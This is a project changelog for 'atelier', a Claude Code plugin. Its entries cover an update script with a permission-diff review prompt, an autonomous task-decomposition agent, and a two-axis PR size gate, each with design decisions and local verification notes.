- **Hardcoded description table over inferred descriptions.** Considered parsing the entry pattern with regex/heuristics to derive descriptions. Rejected: the value of the description is *operational meaning* (`pnpm audit` → "audit dependencies for vulnerabilities"), not surface mechanics. A hardcoded table is the cheapest way to get curated descriptions; the cost of maintaining it is one new entry per permission added to `settings.template.json`. Unknown entries still show in the diff with a fallback placeholder, so the table doesn't gate completeness.
- **Compare templates as un-substituted (`<atelier-config-dir>` placeholders intact).** The diff cares about permission patterns, not the operator's installation path. Comparing the un-substituted clone-local files keeps the diff stable across operators with different config dir paths.
- **Non-interactive mode refuses to apply, never auto-approves.** When stdin is not a TTY (`claude -p`, scripted pipes), the helper refuses to apply permission changes and tells the operator to re-run interactively. The alternative — auto-approving in non-interactive mode — would silently widen the agent's authority during automated update flows. Refusal is the safer default; the operator can always re-run from a TTY when ready.
- **Decline preserves only `settings.template.json` in `$ATELIER_CONFIG_DIR`.** Other templates and the clone state are unaffected. Rationale: the diff is about *permissions*; non-permission template changes and code changes don't carry the same authority-widening risk and should refresh on their normal cadence. If the operator wanted to revert *everything*, they'd `git reset --hard HEAD~N` on the clone.
- **`git show $OLD_SHA:<path>` for the pre-pull content.** Considered stashing the pre-pull file before `git pull`. Rejected: it adds a stateful intermediate, and `git show` against the captured OLD_SHA achieves the same result without touching the working tree.
- **Description-table fallback shows the entry verbatim + `(no description)`.** Considered hiding unknown entries from the diff. Rejected: hiding would mean a real permission change could slip past the operator's review.

**Plugin scope:** mixed.
- Host-OS-layer: `scripts/atelier-permission-diff`, `scripts/atelier-update` (modified), `install.sh` (symlink wiring).
- Plugin-shipped: `commands/update.md`, `templates/settings.template.json`, `operator-rules.md`. Plugin patch bump **0.6.1 → 0.6.2** per PLAN.md §14.2 (plugin-scope additive change in commands + allow list + docs).

**Verified locally with 5 synthetic scenarios:**
- A (`atelier-permission-diff`): identical files → exit 0, no output.
- B (`atelier-permission-diff`): 2 additions → exit 1, rendered block, impact summary, 1 NEW line.
- C (`atelier-permission-diff`): 1 removal → exit 1, rendered block, 0 NEW + 1 REMOVED.
- D (`atelier-permission-diff`): mixed across `allow` + `deny` + `ask` → exit 1, all three categories surfaced.
- E (`atelier-update` end-to-end): upstream pushes a `settings.template.json` change → helper detects it → diff rendered → non-interactive refusal → `$ATELIER_CONFIG_DIR/templates/settings.template.json` preserved with the old allow list, while `project-claude.md.template` refreshes normally and the final report flags the declined state.

`bash -n` + `shellcheck` clean on both scripts.

**Closes M6.1 end-to-end.** The full update path the operator asked about is now:
- `atelier-update` from terminal (non-interactive paths preserve permission state).
- `/atelier:update` from inside Claude Code (interactive prompt resolves cleanly through the harness).
- Either way: `git pull` → classify → refresh non-permission templates → permission-diff prompt → apply or preserve → refresh plugin cache → final report.

**Follow-up paths (not in this PR):**
- **Zsh / bash tab completion for `atelier-*` helpers** — surfaced as friction when the operator typo'd `atelier-uinstall` (missing `n`) and got `command not found`. Cheap follow-up, captured as a future M-series task.
- **Description table data file** — extract the hardcoded mapping into `templates/permission-descriptions.json` if the table grows much beyond 100 entries. Premature optimisation today; revisit if maintenance friction shows up.

### M6.1.a — `atelier-update` engine: `git pull` + delta classification + template refresh + plugin-cache refresh — 2026-05-27
**PR:** [#100](https://github.com/AkaLab-Tech/atelier/pull/100)

First half of `M6.1 — update.sh` (PLAN.md §9). Operators today must remember to run `claude plugin update atelier@akalab-tech` and separately keep their local clone in sync to get the symlinked `~/.local/bin/atelier-*` scripts to the new version. This PR ships the engine (`scripts/atelier-update`) that does both passes in one call. The permission-diff prompt for `settings.template.json` changes and the `/atelier:update` slash command land in M6.1.b.

Motivation: discovered immediately after the M4.24 milestone closed (PRs [#98](https://github.com/AkaLab-Tech/atelier/pull/98) / [#99](https://github.com/AkaLab-Tech/atelier/pull/99)) when the operator's installation was on **5 versions behind** upstream (`0.5.7` vs the new `0.6.0`) and asked for the update path. `install.sh` is intentionally idempotent — it checks plugin presence by id, not version, and skips already-installed plugins — so re-running it does not update anything. Until M6.1 ships, the operator's option was a brittle two-step incantation; this PR collapses it to `atelier-update`.

**Delivered:**

- **New `scripts/atelier-update` (~270 lines bash).** Mirrors the style of the other `atelier-*` host-OS helpers (`atelier-setup-project`, `atelier-doctor`, `atelier-pr-size-check`). Behaviour:
  - Resolves the atelier clone path: `--plugin-root <path>` flag → `$ATELIER_PLUGIN_ROOT` env var → script-relative discovery via `readlink`-ing the `~/.local/bin/atelier-update` symlink to its target in `<clone>/scripts/atelier-update` and `dirname × 2`.
  - Refuses to operate on a dirty working tree (would risk merge conflicts) or on a non-`main` branch (would diverge weirdly with `--ff-only` against `origin/main`).
  - Captures pre-pull SHA + version, runs `git fetch + merge --ff-only origin main`, captures post-pull state. Exit 2 (no error) when nothing was pulled.
  - Classifies changed files into buckets — `scripts/` / `templates/` / `agents/` / `skills/` / `commands/` / `hooks/` / `.claude-plugin/` / `docs` / `other` — so the operator sees what kind of update happened at a glance.
  - Re-instantiates the three templates in `$ATELIER_CONFIG_DIR/templates/`: `settings.template.json` (with `<atelier-config-dir>` substituted), `project-claude.md.template` (verbatim), and `atelier.template.json` (verbatim — added in M7.1.F27). Re-creates the same state install.sh would have left after a fresh run.
  - Invokes `claude plugin update atelier@akalab-tech` and `claude plugin update claude-roadmap-tools@akalab-tech` so Claude Code's plugin cache catches up to the new version. Open sessions keep loading the old version until they restart — surfaced in the final report.
  - **Surfaces a warning** (does not prompt yet) when `templates/settings.template.json` is in the changed-files list: M6.1.a applies the new template as-is; the permission-diff prompt + revert flow lands in M6.1.b along with the `/atelier:update` slash command.
  - `--dry-run` skips the post-pull deltas (template refresh, plugin update) but still applies the `git pull` and emits the bucketed report. Useful for inspection.
  - Exit codes: 0 update applied, 1 error, 2 already up to date.
- **`install.sh` — new symlink** for `atelier-update` alongside the other `atelier-*` helpers in `phase_c_1_setup_project_helper` (one `_phase_c_1_symlink_helper atelier-update` line; same idempotent symlink pattern that the other helpers use).
- **`templates/settings.template.json`** — `Bash(atelier-update:*)` added to the `allow` list (one line), so the M6.1.b slash command (when it lands) and operator-invoked `atelier-update` runs from inside Claude Code sessions don't trip a permission prompt.

**Decisions captured:**

- **Refuse dirty-tree + non-main-branch.** Both are user-state assumptions the script can't safely override. A dirty tree could create merge conflicts the operator didn't ask for; a non-main branch would diverge weirdly with `--ff-only`. Better to fail loudly with an explicit recovery command than to apply a half-update.
- **`--ff-only` over `--rebase`.** Fast-forward is the only safe pull strategy when the operator hasn't made local commits on `main` — and they shouldn't have (atelier's policy is "never commit on `main`"). If `--ff-only` fails, the clone has diverged from upstream and the operator must reconcile manually; `--rebase` would silently rewrite history.
- **Bucketed report instead of raw `git diff --stat`.** `git diff --stat` is correct but noisy; a non-technical operator reads `scripts (1)` / `templates (2)` / `agents (4)` faster than a 40-line file list. The classification matches how the operator thinks about atelier ("scripts changed", "agents changed") rather than raw directory layout.
- **`claude plugin update` failures are warned, not fatal.** The git pull is the load-bearing step (the operator's local clone has the new scripts after that). The plugin cache update is convenience — if `claude` isn't authenticated or the network is down, the operator can still use the `atelier-*` host-OS helpers; only the agents/skills/commands loaded by Claude Code sessions stay on the old version until the plugin cache catches up.
- **Settings-template change handling = warn now, prompt in M6.1.b.** Splitting the engine from the UX kept M6.1.a small enough to dogfood cleanly and gives M6.1.b a single, well-scoped responsibility. The downside: between M6.1.a and M6.1.b landing, an `atelier-update` that changes `settings.template.json` applies silently with only a warning. Acceptable — operators with templates that changed will see the warning and can read `HISTORY.md` for the change rationale; the permission set is additive in the F26/F27/F27.1 lineage, no removed permissions to flag.
- **Symlinks don't need re-creating after `git pull`.** Each `~/.local/bin/atelier-*` symlink points at `<clone>/scripts/atelier-*`. Pulling new content into those files refreshes them in place — the symlink target is unchanged, so the script just resolves to the new content on next invocation. install.sh's symlink step is `if [ -L "$dest" ]; then; sublog "$dest already linked"; fi`, so re-running it after a pull is also a no-op for the same reason. The first time install.sh ships a *new* `atelier-*` helper (like this PR ships `atelier-update`), the operator needs to either re-run `install.sh` or manually symlink — that's why running `atelier-update` itself does **not** re-symlink (it'd be a chicken-and-egg).

**Plugin scope:** mixed.
- Host-OS-layer (no separate `plugin.json` bump for these alone): `scripts/atelier-update`, `install.sh`.
- Plugin-shipped: `templates/settings.template.json`. Plugin patch bump **0.6.0 → 0.6.1** per PLAN.md §14.2 (plugin-scope additive change in the allow list; no behaviour shift for tasks that don't invoke the new helper).

**Verified locally with synthetic scenarios:** A (already up-to-date → exit 2), B (dirty tree → die with file list), C (feature branch → die with switch command), D (2 commits ahead with mixed file changes → exit 0, bucketed report, template refresh applied, settings-changed warning fires). `bash -n` and `shellcheck` clean. The plugin-update step's `claude` failures during synthetic testing are expected (test env has no installed plugin) and confirmed handled with `warn` rather than `die`.

**Follow-up:** M6.1.b lands the permission-diff renderer (`scripts/atelier-permission-diff`), the prompt-and-revert integration in `atelier-update`, the `/atelier:update` slash command, and the docs in `operator-rules.md`. This PR is its blocker.

### M4.24.b — `task-decomposer` agent + `task-orchestrator` step 4 auto-invoke + `/atelier:slice-task` manual override — 2026-05-27
**PR:** [#99](https://github.com/AkaLab-Tech/atelier/pull/99)

Second and final half of `M4.24 — Autonomous task decomposition`. Builds on M4.24.a (PR [#98](https://github.com/AkaLab-Tech/atelier/pull/98)) which formalised the wire-format and the epic-aware parser. This PR wires the **engine**: a new Opus / fresh-context agent that produces the format from a flat task, plus the auto-invocation point in the orchestrator and a slash command for the manual override path.

Behavioural change: from this version onwards, `task-orchestrator` evaluates a small set of oversize-likely heuristics after the tracking move and before planning the work. If any trips, `task-decomposer` runs, rewrites the ROADMAP entry as an epic with sub-tasks, commits the rewrite on `main`, and the orchestrator restarts selection (now picking the first eligible sub-task). The operator sees a single `==> task-decomposer rewrote ...` log line and the chain proceeds — no confirmation prompt, per the design choice captured during the M4.24 planning conversation (full autonomy by default; the `.atelier.json` `taskDecomposer.enabled: false` flag is the opt-out, the size gate from F27 + F27.1 is the safety net).

**Delivered:**

- **`agents/task-decomposer.md` (new, Opus, fresh-context, color: purple).** Reads the ROADMAP entry, scans the codebase (`Grep` + `Glob`, capped at ~30 results), proposes a 2–5-sub-task split where each sub-task is predicted to fit **70% of the project's `prSize` limit** (the 30% headroom absorbs estimation error). Rewrites the ROADMAP block in place; verifies the rewrite (epic prefix present, sub-task ids distinct, `blocked_by` resolves, acceptance criteria preserved). Returns a structured record `{status, epic_id, sub_tasks[], next_to_implement, rationale}`. Refusal outcomes: `refused-already-epic`, `refused-not-found`, `refused-marker-present`, plus `error` for vague specs / missing ids / cross-epic `blocked_by` requirements.
- **`commands/slice-task.md` (new).** Slash command `/atelier:slice-task <task-id>` for the manual override path. Phase 1 pre-flight (project root resolution, `taskDecomposer.enabled` warning, clean-working-tree check), Phase 2 agent dispatch (entry_point: `manual`), Phase 3 commit with `chore(roadmap): decompose <#id> into <N> sub-tasks via /slice-task`, Phase 4 compact operator-facing report. Refuses when run from a task worktree (would target the wrong ROADMAP.md).
- **`agents/task-orchestrator.md` — new step 4 (auto-invoke).** Between step 3 (tracking move) and step 5 (plan the work). Skip conditions: task is already an epic (parser already descended), resume mode, or `.atelier.json` `taskDecomposer.enabled: false`. Heuristic triggers (any one fires the dispatch): `~estimate > 4h`, > 5 acceptance bullets, title/body matches `\b(epic|system|platform|framework|module|refactor)\b`, or task body mentions ≥ 3 distinct top-level dirs. On `status: decomposed`: visible log line, commit the rewrite on `main`, restart selection from step 1. On `refused-*` or `error`: surface and **do not consume retry budget** (the decomposer is upstream of `retry-with-logs`; its failures are spec / config issues, not flaky execution). Numbering shifted: original step 4 (Plan) → 5, step 5 (Delegate) → 6, step 6 (Retry) → 7, step 7 (Close) → 8, with cross-references updated throughout.

**Decisions captured:**

- **Fully autonomous decomposition (no operator confirmation).** Operator's explicit choice during M4.24 planning: maximise autonomy aligned with atelier's original vision (non-technical operator delivering software without manual branching / testing / PR work). The risks (incoherent splits, sub-PRs that don't compile alone) are mitigated by (a) the F27 size-gate catching sub-tasks that still come out oversize, (b) the push-gate (lint + typecheck + tests) catching sub-PRs that don't compile in isolation, (c) the operator-visible log line giving them a clear interrupt point, (d) the per-project opt-out via `.atelier.json`. If the trade-off proves wrong in practice (operators ignore the log line and accept bad splits), escalate to "ask before proceeding" — a one-line change in this step 4.
- **70%-of-budget heuristic in the decomposer.** Each sub-task is targeted at ≤ 140 lines AND ≤ 7 files (when defaults are in effect). The 30% headroom is the agent's estimation error budget — pre-implementation analysis suggests this is roughly the right order of magnitude. A future iteration can tighten this once we have real data on the agent's estimation accuracy.
- **Step 4 placement (after tracking move, before worktree creation in the auto path).** The tracking move commits the original task entry to the per-task worktree as `chore(tracking): start task #<id> → IN_PROGRESS`. If the decomposer then rewrites the entry, we'd have two competing realities — the worktree thinks task #42 is active, but `main`'s ROADMAP now says #42 is an epic and #42a is the active task. Resolution: the decomposer commits to **`main`**, not the task worktree, and the orchestrator restarts selection from step 1 *before* the task worktree is created. The orchestrator's original ordering (1 → 2 → 3 → 4 → 5 → ...) was monotonic; the new step 4 introduces a possible loop (4 → back to 1). That loop terminates because the second pass picks a sub-task, which by construction isn't an epic, so step 4's "task is already an epic" skip condition fires and the chain proceeds linearly.
- **Manual `/slice-task` is decompose-only, never auto-claim.** After `/slice-task` rewrites a task into an epic, the operator must invoke `/next-task` (or the orchestrator's normal flow) to actually claim the first sub-task. Rationale: keeping the decompose-vs-claim boundary explicit lets the operator review the rewrite before any worktree is created.

**Plugin scope:** plugin-shipped — `agents/task-decomposer.md`, `commands/slice-task.md`, `agents/task-orchestrator.md`. **Minor** version bump **0.5.11 → 0.6.0** per PLAN.md §14.2 (new feature: orchestrator gains a new autonomous decision point + new agent + new slash command, not just a fix or additive doc).

**Follow-up paths (not in this PR):**
- **Dogfood-5** — run a deliberately oversize task through the chain and observe the decomposer's split. Capture friction (bad splits, wrong heuristic triggers, missed cases) and feed into a future iteration.
- **JSON Schema for `.atelier.json`** (still pending from F27) — would catch `taskDecomposer.eanbled` typos at config-load time instead of silently defaulting to `true`.
- **Slicer for diff-time decomposition (v2)** — agent that takes an already-implemented oversize diff and proposes splitting it into sub-PRs along boundaries. Useful only if the up-front decomposer's coverage proves insufficient.

### M4.24.a — Epic + sub-task ROADMAP convention, epic-aware `task-discovery`, `.atelier.json` `taskDecomposer.enabled` flag — 2026-05-27
**PR:** [#98](https://github.com/AkaLab-Tech/atelier/pull/98)

First half of `M4.24 — Autonomous task decomposition` (the second half, M4.24.b, adds the actual `task-decomposer` agent + the `task-orchestrator` auto-invoke step + the `/atelier:slice-task` slash command). This PR is **format-only**: it formalises the wire-format the engine in M4.24.b will read and write, with no behavioural change to today's chain. Decoupling the format from the engine lets the operator hand-author epics today (and the orchestrator already handles them via the extended `task-discovery`), with the auto-decomposition layer landing on top in M4.24.b without re-litigating the schema.

Motivation: M7.1 dogfood-4 surfaced that the size-gate from F27 + F27.1 catches oversize PRs but only **reactively** — the operator pays the implementer + tester cost on a task that was always going to be too large. The structural fix is to express large work as an epic-with-sub-tasks **before** the chain runs, so each sub-task fits the per-project size budget independently and merges autonomously. M4.24.a is the format; M4.24.b is the agent that produces the format from a flat task.

**Delivered:**

- **`PLAN.md §5` — Epic + sub-tasks subsection.** Formalises the wire format: epic line title starts with `Epic:`; sub-tasks indented two spaces; sub-task ids use letter suffixes (`#42a`, `#42b`); `blocked_by` resolves against siblings first, then global scope; epic checkbox is **derived** from sub-task state, not manually edited. Extends the selection order to descend into epics before considering their containers. `[OVERSIZE]` / `[BLOCKED]` markers cascade per-line (on the epic → whole epic skipped; on a sub-task → that sub-task only).
- **`skills/task-discovery/SKILL.md` — epic-aware parsing.**
  - **Selection algorithm step 2** now descends into epic blocks: if the first unchecked item is an epic, the candidate is its first eligible sub-task (not the epic itself, which is never claimed directly).
  - **New step 4** filters out `[OVERSIZE]` / `[BLOCKED]` markers explicitly at this layer (previously implicit via the orchestrator).
  - **Epic-aware parsing section** documents the recognition rule (title `Epic:` + indented sub-task next line), id-suffix regex (`^#<digits>[a-z]?(-\d+)?$`), auto-derived epic checkbox, indentation tolerance (2 or 4 spaces; tabs normalised; deeper nesting refused with a warning).
  - **Output record** gains optional `epic_parent` and `epic_siblings` fields, present only when the picked task is a sub-task — the orchestrator uses these to know whether to fast-track the next sibling vs returning to top-level selection after the sub-task merges.
- **`operator-rules.md` — new "Epic + sub-tasks" section.** Brief operator-facing summary of the format (with the same example as PLAN.md §5) plus the three ways the operator interacts with auto-decomposition (pre-empt by writing the epic manually; override via `/atelier:slice-task`; disable via `.atelier.json`). Forward-references M4.24.b for the engine.
- **`templates/atelier.template.json` — new `taskDecomposer.enabled` field.** Default `true`. The `_comment` next to it explains the flag's relationship to M4.24.b and that the manual `/atelier:slice-task` stays available regardless of the flag's value.
- **`commands/setup-project.md`** — step 5 description extended to mention the new `taskDecomposer.enabled` field alongside `prSize.*`.

**Decisions captured:**

- **Format-only PR (this) vs combined PR.** Considered shipping format + engine in a single PR (`M4.24` without the `.a` / `.b` split). Rejected because the combined diff was estimated at ~400 lines / ~10 files — under the AND-gate but borderline, and a single PR cannot dogfood its own splitting. Splitting also means M4.24.a is **immediately useful**: an operator who pre-writes epics gets the orchestrator's epic-aware selection behaviour today, without waiting for M4.24.b.
- **Sub-task id format: letter suffix (`#42a`) over numeric (`#42-1`).** Both accepted by the parser (regex `^#<digits>[a-z]?(-\d+)?$`); recommended form is the letter suffix because it stays short (max 1 char added) and reads naturally in conversation ("did #42a land yet?"). The numeric suffix is the escape hatch for epics with > 26 sub-tasks — that being said, an epic with > 26 sub-tasks is almost certainly mis-shaped and should be split into multiple epics instead.
- **Epic checkbox derived, not edited.** Tooling computes `[x]` ⇔ all sub-tasks `[x]` on every read. If the operator manually flips the epic checkbox and the derived state differs, the skill surfaces the inconsistency and trusts the derived value. Rationale: avoids two sources of truth that can drift, especially during the long span when the epic is mid-decomposition (some sub-tasks done, others not).
- **Two markers cascade per-line, not per-block.** A `[BLOCKED]` on the epic skips the whole epic; the same marker on a sub-task skips only that sub-task. This is symmetric with how `blocked_by` works (resolves against siblings) and lets the operator handle partial-epic blockers without abandoning the entire epic.
- **`taskDecomposer.enabled` flag default = `true`.** Optimises for the original atelier vision (the non-technical operator who writes tasks without thinking about size). Operators who want manual control can flip the flag to `false`; the choice is per-project (lives in `.atelier.json`, version-controlled).

**Plugin scope:** plugin-shipped — `skills/task-discovery/SKILL.md`, `operator-rules.md`, `commands/setup-project.md`, `templates/atelier.template.json`. `PLAN.md` is repo-internal but counted in the bump rationale because the schema it documents is now load-bearing for the skill. Patch bump **0.5.10 → 0.5.11** per PLAN.md §14.2 (plugin-scope additive change; no behaviour shift for existing flat-task workflows).

**Follow-up:** M4.24.b lands the `task-decomposer` agent + orchestrator auto-invoke step + `/atelier:slice-task` command. This PR is its blocker.

### M7.1.F27.1 — `[OVERSIZE]` marker + orchestrator handles `pr-author`'s `oversized` return as a terminal state, not a retry-able failure — 2026-05-27
**PR:** [#97](https://github.com/AkaLab-Tech/atelier/pull/97)

Discovered immediately after M7.1.F27 (PR [#96](https://github.com/AkaLab-Tech/atelier/pull/96)) merged. F27 wired the pre-push size gate into `pr-author` step 5 and the auto-merge guardrail #5, but stopped short of teaching `task-orchestrator` what to do when it receives `pr-author`'s new `oversized` return. Net effect for the operator in the post-F27 / pre-F27.1 window: an oversize task chain reaches `pr-author`, the size gate trips, `pr-author` returns `oversized` — and `task-orchestrator` had no branch for it, so the most likely behavior was the failure being routed through `retry-with-logs` (consuming the 6-attempt budget on a deterministic failure that re-running won't fix) and ending in an `unblocker` `blocked` issue that technically mislabels the cause.

This patch closes the gap: oversized is now a first-class **terminal** state for the chain, parallel to `merged` / `held` / `request-changes` / `blocked`, with its own marker (`[OVERSIZE]`) in `IN_PROGRESS.md`, its own resolution paths surfaced to the operator, and explicit instructions across the chain that it must **not** consume retry budget.

**Delivered:**

- **`agents/pr-author.md` step 5** — when `atelier-pr-size-check` exits 1, `pr-author` now (a) prepends `[OVERSIZE]` to the task's heading line in `IN_PROGRESS.md`, (b) commits the marker as `chore(tracking): mark #<id> [OVERSIZE] — see size-check output` on the same task branch, (c) returns the existing `oversized` payload to the orchestrator. The marker becomes visible to `/atelier:status` and to the next `task-orchestrator` invocation immediately.
- **`agents/task-orchestrator.md`:**
  - **Step 1 (resume mode / IN_PROGRESS scan)** — adds a `[OVERSIZE]` ignore rule parallel to the existing `[BLOCKED]` rule. The orchestrator filters out oversize entries from `/next-task` so they don't block the operator from advancing.
  - **Step 5 (delegate)** — `pr-author` description now states explicitly that it may return `oversized` instead of a PR URL, and points to step 7's terminal branch.
  - **Step 7 (close the loop)** — new `oversized` branch: do NOT invoke `retry-with-logs`, do NOT invoke `unblocker`, do NOT consume the 6-attempt budget, do NOT auto-advance to the next ROADMAP item (unlike `blocked`, since the operator owns the resolution decision). Surface a three-option message to the operator: (a) re-plan into sub-tasks using the tool's slicing hints verbatim, (b) `gh pr create` manually (auto-merge will hold for human review), or (c) raise the budget in `<project>/.atelier.json` and re-invoke. The worktree stays on disk for the operator to act on.
  - **Decision rules** — explicit "never treat `oversized` as retry-able" entry, with the rationale (re-invoking `implementer` without slicing instructions would regenerate the same diff; size budget is a design constraint, not a flaky check).
  - **Output format** — the chain's terminal status string gains a new variant: `oversized — <lines>/<files>, branch task/<id>-<slug> pushed without PR`.
- **`agents/unblocker.md` hard refusals** — new entry refusing to handle `oversized` returns. Defensive: if the orchestrator ever mis-routes an oversized state into `unblocker`, the agent stops and reports the orchestrator-side bug instead of opening a `blocked` issue with the wrong cause.
- **`commands/status.md`:**
  - **Section 1 (in-progress tasks)** — now classifies each `IN_PROGRESS.md` entry by marker prefix: no marker / `[BLOCKED]` / `[OVERSIZE]`. Each marker gets its own description of who handles it and how.
  - **Dashboard template** — new `▶ Oversize (PR refused by size gate)` section parallel to the `▶ Blocked in ROADMAP.md` section. Each oversize entry lists the branch (with the "pushed, no PR" note) and the three resolution options inline so the operator does not need to recall them.

**Decisions captured:**

- **Marker prefix vs separate file.** Considered a `<project>/.task-log/<id>.oversized` sentinel file instead of an in-line marker. Rejected because the existing `[BLOCKED]` convention already proves this pattern works — single source of truth (`IN_PROGRESS.md`), single read for any agent or slash command, no parallel file to keep in sync. The `[OVERSIZE]` marker reads symmetrically with `[BLOCKED]` and `/atelier:status` already had the scanning machinery for one prefix; adding the second is trivial.
- **Do not auto-advance after `oversized`.** The `blocked` branch in step 7 advances to the next ROADMAP item (because the operator's recovery is async — they look at the issue queue later). Oversize is different: the operator's next action is immediate (split or open manually) and they need the current worktree intact to act on it. Advancing would steal focus.
- **Marker commit is `chore(tracking)`, not `chore(status)` or `feat`.** Same conventional-commits scope as the existing `chore(tracking)` commits in `pr-author` step 3 and `task-orchestrator` step 3 (the `ROADMAP → IN_PROGRESS` and `IN_PROGRESS → HISTORY` moves). Consistency over fine-grained taxonomy.
- **No equivalent of `unblocker` for oversize.** Oversize doesn't need a dedicated agent because there's no GitHub issue to open, no `blocked` label to apply, no 6-log evidence pack to attach — just an in-band marker and an operator-visible message. The marking happens inline inside `pr-author` step 5 (which is already the agent that knows it tripped the gate). An "atelier:slicer" agent that auto-splits the diff would belong here in v2 — out of scope for F27.1, captured as follow-up.

**Plugin scope:** plugin-shipped — `agents/pr-author.md`, `agents/task-orchestrator.md`, `agents/unblocker.md`, `commands/status.md` are all loaded by Claude Code from the plugin root. Patch bump **0.5.9 → 0.5.10** per PLAN.md §14.2.

**Follow-up paths (not in this PR):**
- **`atelier:slicer` agent (v2)** — invoked by `pr-author` on exit 1 from the size check, automatically splits the diff into sub-PRs along the suggested boundaries. Useful only if F27.1's operator-driven slicing flow proves slow in practice.
- **Preventive splitting in `task-orchestrator`** — estimate task size from the ROADMAP entry and propose sub-tasks *before* delegating to `implementer`. Same milestone idea as the F27 follow-up (`M4.x — Task slicing engine`).

### M7.1.F27 — PR size budget: AND-gate (200 lines / 10 files post-exemptions) + pre-push gate + per-project `.atelier.json` — 2026-05-27
**PR:** [#96](https://github.com/AkaLab-Tech/atelier/pull/96)

Discovered during M7.1 dogfood-4 immediately after M7.1.F26 (PR [#95](https://github.com/AkaLab-Tech/atelier/pull/95)) merged. An atelier-orchestrated task on the operator's `storefront` project produced a PR over 500 lines; the `auto-merge` skill's existing guardrail #5 held it for human review. The threshold was working as designed, but two problems surfaced:

- **Reactive only.** The 500-line gate enforced *after* `pr-author` had already opened the PR and `reviewer` had spent its Opus-fresh-context cycle approving. The held-PR outcome looked the same as a malformed PR — the operator had to inspect to learn it was just oversized. The auto-merge gate is the wrong place to first discover a size problem; by that point the chain has burned an `implementer`, `tester`, `pr-author`, and `reviewer`.
- **Threshold too generous, dimension too narrow.** 500 lines covers a 250-line monolithic refactor of one file and a 50-line cleanup spread across 20 unrelated subsystems with equal indifference. The first is reviewable; the second is a slicing problem. A single line-count gate cannot tell them apart.

Root direction: keep the gate, but enforce it earlier *and* on both axes (lines + files), with project-configurable thresholds and built-in exemptions for the diff content that does not contribute to reviewability (auto-generated lockfiles, test code, DB migrations).

**Delivered:**

- **New script `scripts/atelier-pr-size-check`** (host-OS layer, symlinked by `install.sh` Phase C.1 alongside the other `atelier-*` binaries). Two evaluation modes:
  - `--branch <name> [--base main]` — local pre-push mode. Uses `git diff --numstat`. No network.
  - `--pr <NN>` — post-push remote mode. Uses `gh pr view --json files`.
  - In both modes: reads `<project>/.atelier.json` (or built-in defaults), filters paths against the `prSize.exempt` glob list (bash-3.2-portable `case` matching with `**/` prefix fallback for root-level dirs), and applies the AND-gate over the non-exempt remainder. Exit 0 within budget, exit 1 OVERSIZE (with suggested slice boundaries by top-level dir), exit 2 error.
- **AND-gate threshold (200 lines AND 10 files post-exemptions)** replaces the prior OR-style `additions+deletions > 500`. The AND-gate is deliberate: a tightly-scoped diff that grows long, or a broad refactor that stays small, both pass — only PRs that breach *both* axes auto-block. Operator decision from the M7.1.F27 design conversation (2026-05-27).
- **New `templates/atelier.template.json`** (bundled with the plugin, copied to `$ATELIER_CONFIG_DIR/templates/` by `install.sh` Phase C.1 alongside `settings.template.json` and `project-claude.md.template`). Default `prSize.{maxLines:200, maxFiles:10}` plus a 14-entry `exempt` list (lockfiles, `**/*.test.*`, `**/*.spec.*`, `**/__tests__/**`, `**/tests/**`, `**/e2e/**`, `**/playwright/**`, `**/cypress/**`, `**/migrations/**`, `**/*.sql`, `**/*.snap`, `**/*.generated.*`).
- **`scripts/atelier-setup-project` — new `step_atelier_config_json`** between `step_settings_json` and `step_roadmap_files`. Seeds `<project>/.atelier.json` from the template when missing; **never overwrites** once it exists (the operator owns this file after creation — to reset to defaults, delete the file and re-run `setup-project`). Falls back silently if the template is missing in `$ATELIER_CONFIG_DIR/templates/` (older install — `atelier-pr-size-check` uses its built-in defaults regardless, so absence is non-fatal).
- **Three new gate points wired into the chain:**
  - **`agents/pr-author.md` step 5** (between push and `gh pr create`): invoke `atelier-pr-size-check --branch task/<id>-<slug> --base main --project <worktree>`. On exit 1, return `{"status": "oversized", ...}` to the orchestrator with the tool's full stdout. The PR does not get opened in oversized shape — the prior steps (`implementer`, `tester`, push) keep their work product on the branch; only the `gh pr create` is short-circuited.
  - **`skills/pr-flow/SKILL.md` step 5** (same intent, same command, executable form for the slash-command path that doesn't dispatch `pr-author`). Numbering shifted: tracking move stays at step 4, size gate is step 5, PR creation is step 6, report is step 7.
  - **`skills/auto-merge/SKILL.md` guardrail #5** rewritten to invoke `atelier-pr-size-check --pr <NN> --project <project-root>` instead of the prior inline `gh pr view --json additions,deletions`. Held-state message now reports both axes plus the slicing hints from the tool's stdout. `agents/reviewer.md` gains a parallel finding template for the same case (operator manually opened an oversized PR bypassing the orchestrator).
- **Text updates in the four reference surfaces** so the threshold language is consistent everywhere: `PLAN.md §6`, `CLAUDE.md`, `operator-rules.md`, `commands/setup-project.md`. Each mentions the AND-gate, the exemption list, and the per-project override path.

**Decisions captured:**

- **AND vs OR for the gate.** OR (either dimension trips → blocked) would be stricter but would block legitimate atomic changes: a single-file refactor touching 250 lines, or a 50-line type-rename spread across 12 files, are both reviewable. AND blocks only the cases where slicing is genuinely possible (multiple subsystems touched AND total diff is long). Operator's explicit choice in the design conversation.
- **Exemptions in defaults vs configurable.** Both. The built-in list covers ~95% of cases (tests, lockfiles, migrations); per-project overrides via `.atelier.json` cover the long tail (project-specific generated paths, vendored code, etc.). The override path is a single jq lookup — no schema validation cost.
- **`.atelier.json` location: project root, not `.claude/`.** `.claude/` is Claude Code's scope; mixing atelier config there confuses the schema. `.atelier.json` at the repo root is atelier's own namespace, parallel to `.nvmrc` / `.npmrc` / `.gitignore`. It is **not** gitignored — the size budget is part of the project's source of truth, version-controlled and reviewable.
- **Never-overwrites policy for `.atelier.json`.** Same logic as F26 for legacy `settings.json` but flipped: this file is *new in F27*, so a pre-existing file in a project's working dir is the operator's customization, not a legacy artifact to migrate. The operator deletes the file to reset to defaults (clear, deterministic) — atelier never silently rewrites it.
- **Pre-push gate at the latest possible moment in the chain (after the tracking commit, before `gh pr create`).** The diff is only complete at that point — measuring earlier would undercount and let oversized PRs through; measuring later (in `auto-merge`) is too late, since `reviewer` already ran. The branch on `origin` is fine to leave behind on a held verdict — nothing landed past what the operator approved.
- **Bash 3.2 portability.** macOS ships bash 3.2 (Apple-licensing reasons); `shopt -s globstar` and `declare -A` are bash-4 features. `atelier-pr-size-check` uses `case` pattern matching with a `**/`-prefix fallback for root-level dirs, plus `sort | uniq -c` instead of associative arrays. Verified across the 7 synthetic scenarios used during development.

